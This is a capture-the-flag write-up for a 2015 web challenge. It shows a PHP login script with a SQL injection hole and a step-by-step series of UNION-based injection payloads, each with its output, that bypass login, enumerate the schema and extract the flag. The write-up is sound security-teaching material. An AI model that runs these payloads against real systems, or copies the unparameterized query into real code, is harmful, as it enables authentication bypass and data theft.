## HAXDUMP 2015 - Keep Calm and Save The Queen (Web 100)
##### 07/02/2015 (8hr)
___

### Description: 
The Queen's own online web portal thing!
 			 godsavethequeen.haxdump.com
			 godsavethequeen.tar.xz
___
### Solution

We have the source. Let's look at the injection point (index.php):
```php
<?php
	include("database.php");

	if(isset($_POST['username'])) {
	  $username = $_POST['username'];
	  $sql = "SELECT * from users where username='$username'";
	  $result = mysql_query($sql, $db);

	  $row = mysql_fetch_assoc($result);

	  if($_POST['password'] === $row['password']) {
		session_start();
		$_SESSION['wow'] = true;
		echo "<h4 align='center'>User ".$row['username']." successfully logged in!</h4>";
	  }
	  else {
?>
```
It's obvious where the injection is. Let's register a user foo:bar and start crafting our injection: 
```
	username=foo&password=bar					--> User foo successfully logged in!
	username=foo' AND '1'='1&password=bar		-->  User foo successfully logged in!
```
Easy, isn't it? Go on.
```
	username=bar' UNION ALL SELECT 'foo', 'bar' -- &password=bar	
```
--> User foo successfully logged in!

The query:
```
	username=bar' username=bar' UNION ALL SELECT 'ispo', 'bar'-- &password=bar 
```
gives: "User ispo successfully logged in!". However  user ispo is not registered.

Let's find the database first:
```
	username=bar' UNION ALL SELECT (SCHEMA()), 'bar'-- &password=bar
```	
--> User briton successfully logged in!

Then the tables:
```
	username=bar' UNION ALL SELECT (SELECT GROUP_CONCAT(table_name) 
				 FROM information_schema.tables WHERE table_schema='briton'), 'bar'-- &password=bar 
```
--> User flags,users successfully logged in!

We'll assume that flag table has 1 column:
```
	username=bar' UNION ALL SELECT (SELECT * FROM flags), 'bar'-- &password=bar 
```
--> User **D0_Y0U_H34R_TH3_P30PL3_H4X** successfully logged in!

If flag table didn't had 1 column, we could get the columns as follows:
```
	username=bar' UNION ALL SELECT (SELECT GROUP_CONCAT(column_name) 
			FROM information_schema.columns WHERE table_name='flags'), 'bar'-- &password=bar 
```
--> User flag successfully logged in!
___